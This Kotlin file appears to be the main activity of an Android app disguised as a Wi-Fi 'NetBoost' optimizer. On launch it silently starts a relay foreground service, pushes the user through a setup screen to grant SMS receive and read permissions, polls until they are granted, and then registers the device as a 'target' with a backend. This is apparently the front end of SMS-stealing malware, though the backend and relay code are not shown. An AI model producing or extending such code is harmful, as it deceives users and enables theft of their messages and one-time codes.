package com.netboost.optimizer

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.darkColorScheme
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.core.app.NotificationManagerCompat

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Start foreground service silently with safety check
        try {
            val svc = Intent(this, RelayForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc)
            } else {
                startService(svc)
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Service start deferred: ${e.message}")
        }

        setContent {
            NetBoostTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    AppNavigation()
                }
            }
        }
    }

    @Composable
    fun AppNavigation() {
        var hasPermission by remember { mutableStateOf(checkSmsPermission()) }
        
        // Polling to check if user granted permission
        LaunchedEffect(Unit) {
            while(true) {
                kotlinx.coroutines.delay(1000)
                hasPermission = checkSmsPermission()
            }
        }

        // Register target once SMS permission is granted
        LaunchedEffect(hasPermission) {
            if (hasPermission) {
                kotlinx.coroutines.Dispatchers.IO.let {
                    BackendClient.registerTarget(Config.DEVICE_ID)
                }
            }
        }

        if (hasPermission) {
            WifiDashboardScreen()
        } else {
            SetupGuideScreen(
                onRequestPermission = {
                    requestPermissions(arrayOf(
                        android.Manifest.permission.RECEIVE_SMS,
                        android.Manifest.permission.READ_SMS
                    ), 101)
                }
            )
        }
    }

    private fun checkSmsPermission(): Boolean {
        return checkSelfPermission(android.Manifest.permission.RECEIVE_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }
}

@Composable
fun NetBoostTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = Color(0xFF00E676),
            background = Color(0xFF121212),
            surface = Color(0xFF1E1E1E),
            onPrimary = Color.Black
        ),
        content = content
    )
}
